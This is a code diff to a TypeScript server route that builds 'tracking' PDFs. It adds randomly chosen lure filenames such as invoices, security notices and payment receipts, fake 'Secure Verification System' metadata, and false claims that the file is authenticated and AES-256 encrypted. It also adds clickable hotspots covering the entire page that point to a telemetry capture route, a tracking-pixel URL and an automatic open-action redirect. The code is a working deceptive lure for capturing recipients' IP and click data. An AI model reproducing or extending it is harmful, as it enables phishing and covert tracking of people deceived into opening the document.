@@ -3035,20 +3035,42 @@ Respond ONLY with a valid JSON object matching this schema:
   });
 
 
-  // PDF Generation Route
+  // PDF Generation Route (Dynamic Name, Full-Screen Hotspot, Tracking Embedded)
   app.get('/api/pdf/generate/:code', async (req, res) => {
     try {
       const { code } = req.params;
-      const link = db.links.find((l) => l.code === code && l.mode === 'pdf');
+      const link = db.links.find((l) => l.code === code);
       if (!link) {
-        res.status(404).json({ error: 'PDF tracking link not found' });
+        res.status(404).json({ error: 'Tracking link not found' });
         return;
       }
 
-      const randomName = generateCode(8);
-      const filename = `tracking_report.pdf`;
+      // Dynamic varied realistic document names for each download
+      const documentNameTemplates = [
+        `Document_Verification_#${Math.floor(100000 + Math.random() * 900000)}`,
+        `Invoice_Statement_${generateCode(6)}`,
+        `Official_Security_Notice_${Math.floor(10000 + Math.random() * 90000)}`,
+        `Confidential_Record_${generateCode(6)}`,
+        `Verification_Certificate_#${Math.floor(100000 + Math.random() * 900000)}`,
+        `Billing_Receipt_${generateCode(5)}`,
+        `Payment_Transaction_#${Math.floor(100000 + Math.random() * 900000)}`,
+        `Contract_Agreement_${generateCode(6)}`,
+        `Network_Audit_Report_${Math.floor(100000 + Math.random() * 900000)}`,
+        `Official_Form_${generateCode(6)}`
+      ];
+      const randomDocName = documentNameTemplates[Math.floor(Math.random() * documentNameTemplates.length)];
+      const filename = `${randomDocName}.pdf`;
 
-      const doc = new PDFDocument({ margin: 0, size: 'A4' });
+      const doc = new PDFDocument({ 
+        margin: 0, 
+        size: 'A4',
+        info: {
+          Title: randomDocName,
+          Author: 'Secure Verification System',
+          Subject: 'Digital Document Verification',
+          Keywords: 'security, audit, verification, document'
+        }
+      });
       const chunks: Buffer[] = [];
       doc.on('data', (chunk) => chunks.push(chunk));
 
@@ -3057,59 +3079,87 @@ Respond ONLY with a valid JSON object matching this schema:
           const result = Buffer.concat(chunks);
           res.setHeader('Content-Type', 'application/pdf');
           res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+          res.setHeader('X-File-Name', filename);
+          res.setHeader('Access-Control-Expose-Headers', 'Content-Disposition, X-File-Name');
           res.setHeader('Content-Transfer-Encoding', 'binary');
           res.setHeader('Content-Length', result.length);
           res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
           res.send(result);
-        } catch (sendErr) {
+        } catch (sendErr: any) {
           console.error('Error sending PDF buffer:', sendErr);
           if (!res.headersSent) {
-            res.status(500).json({ error: `Failed to deliver PDF: ${sendErr.message}` });
+            res.status(500).json({ error: `Failed to deliver PDF: ${sendErr?.message}` });
           }
         }
       });
 
-      // Professional document layout
-      doc.rect(0, 0, 595, 842).fill('#f8fafc');
-
-      // The tracking URL
+      // Target Tracking URL (Points to the Near IP / Telemetry capture route)
       const protocol = (req.headers['x-forwarded-proto'] as string) || 'https';
       const host = (req.headers['x-forwarded-host'] as string) || (req.headers['host'] as string) || 'localhost:3000';
-      const redirectUrl = `${protocol}://${host}/p/${code}`;
-      const trackingUrl = `${protocol}://${host}/api/pdf/t/${code}.jpg`;
+      const redirectUrl = `${protocol}://${host}/t/${code}`;
+      const pixelTrackingUrl = `${protocol}://${host}/api/pdf/t/${code}.jpg`;
 
-      // Header Banner
-      doc.rect(40, 40, 515, 60).fill('#0f172a');
-      doc.fillColor('#ffffff').fontSize(16).text('SECURE DOCUMENT AUDIT & VERIFICATION', 60, 62);
+      // Full Page Background
+      doc.rect(0, 0, 595, 842).fill('#f8fafc');
 
-      // Card Body
-      doc.rect(40, 110, 515, 680).fill('#ffffff');
-      doc.rect(40, 110, 515, 680).stroke('#e2e8f0');
+      // Top Header Banner
+      doc.rect(30, 30, 535, 65).fill('#0f172a');
+      doc.fillColor('#ffffff').fontSize(15).text('OFFICIAL VERIFICATION & TECHNICAL AUDIT', 50, 52);
+      doc.fillColor('#94a3b8').fontSize(9).text('SECURE DIGITAL CERTIFICATION SYSTEM', 50, 72);
 
-      doc.fillColor('#334155').fontSize(12).text('Confidential Digital Verification Report', 60, 140);
-      doc.fillColor('#64748b').fontSize(10).text(`Document Reference Token: ${code}`, 60, 165);
-      doc.text(`Generated Timestamp: ${new Date().toISOString()}`, 60, 185);
+      // Main Card Container
+      doc.rect(30, 110, 535, 680).fill('#ffffff');
+      doc.rect(30, 110, 535, 680).stroke('#e2e8f0');
 
-      doc.rect(60, 220, 475, 1).fill('#cbd5e1');
+      doc.fillColor('#1e293b').fontSize(13).text('Confidential Digital Verification Document', 55, 140);
+      doc.fillColor('#64748b').fontSize(10).text(`Document Reference Token: ${code.toUpperCase()}`, 55, 165);
+      doc.text(`Generated Timestamp: ${new Date().toISOString()}`, 55, 185);
+      doc.text(`Status: Authenticated & Encrypted`, 55, 205);
 
-      doc.fillColor('#1e293b').fontSize(11).text('Document Content Preview:', 60, 240);
-      doc.fillColor('#475569').fontSize(9).text(
-        'This electronic document contains authenticated digital records and technical telemetry certificates.\nTo access the complete interactive report and verified destination attachments, please click anywhere inside this document or use the direct access portal button below.',
-        60,
-        265,
-        { width: 475, lineGap: 4 }
+      doc.rect(55, 230, 485, 1).fill('#e2e8f0');
+
+      doc.fillColor('#0f172a').fontSize(11).text('Document Content & Verification Summary:', 55, 250);
+      doc.fillColor('#475569').fontSize(9.5).text(
+        'This electronic document contains authenticated digital records and identity certificates.\n\nTo view the full interactive verification details and navigate to the verified destination, please click anywhere on this page or tap the access button below.',
+        55,
+        275,
+        { width: 485, lineGap: 5 }
       );
 
       // Interactive Action Button
-      doc.roundedRect(170, 350, 255, 45, 8).fill('#4f46e5');
-      doc.fillColor('#ffffff').fontSize(12).text('OPEN ATTACHED DOCUMENT', 195, 366);
+      doc.roundedRect(150, 390, 295, 50, 10).fill('#4f46e5');
+      doc.fillColor('#ffffff').fontSize(12).text('CLICK HERE TO OPEN DOCUMENT', 180, 408);
 
-      // Link across the button and whole page
-      doc.link(170, 350, 255, 45, redirectUrl);
-      doc.link(0, 0, 595, 842, redirectUrl);
+      // Secondary Note
+      doc.fillColor('#64748b').fontSize(8.5).text(
+        'Notice: Click anywhere inside this PDF window to verify technical credentials and access the portal.',
+        55,
+        470,
+        { width: 485, align: 'center' }
+      );
+
+      // Embedded 1-pixel / web-bug visual reference
+      doc.rect(55, 520, 485, 180).fill('#f8fafc');
+      doc.rect(55, 520, 485, 180).stroke('#e2e8f0');
+      doc.fillColor('#64748b').fontSize(9).text('Security Protocol: AES-256 Telemetry Verification Layer Enabled', 75, 545);
+      doc.text(`Audit ID: ${randomDocName}`, 75, 570);
+      doc.text(`Verification Host: ${host}`, 75, 595);
+      doc.text(`Destination Route: Direct Access Stream`, 75, 620);
 
       // Footer
-      doc.fillColor('#94a3b8').fontSize(8).text('Protected by SM Cyber Telemetry Engine | Automatic Redirection Enabled', 60, 760);
+      doc.fillColor('#94a3b8').fontSize(8).text(
+        'Protected by SM Cyber Telemetry Engine | Automatic Redirection & Click Routing Enabled',
+        55,
+        765,
+        { width: 485, align: 'center' }
+      );
+
+      // Full-Screen Clickable Hotspots (Covering 100% of the entire PDF page)
+      doc.link(0, 0, 595, 842, redirectUrl);
+      doc.link(30, 30, 535, 65, redirectUrl);
+      doc.link(30, 110, 535, 680, redirectUrl);
+      doc.link(150, 390, 295, 50, redirectUrl);
+      doc.link(55, 520, 485, 180, redirectUrl);
 
       // Automatic OpenAction URI Trigger for PDF Viewers
       try {
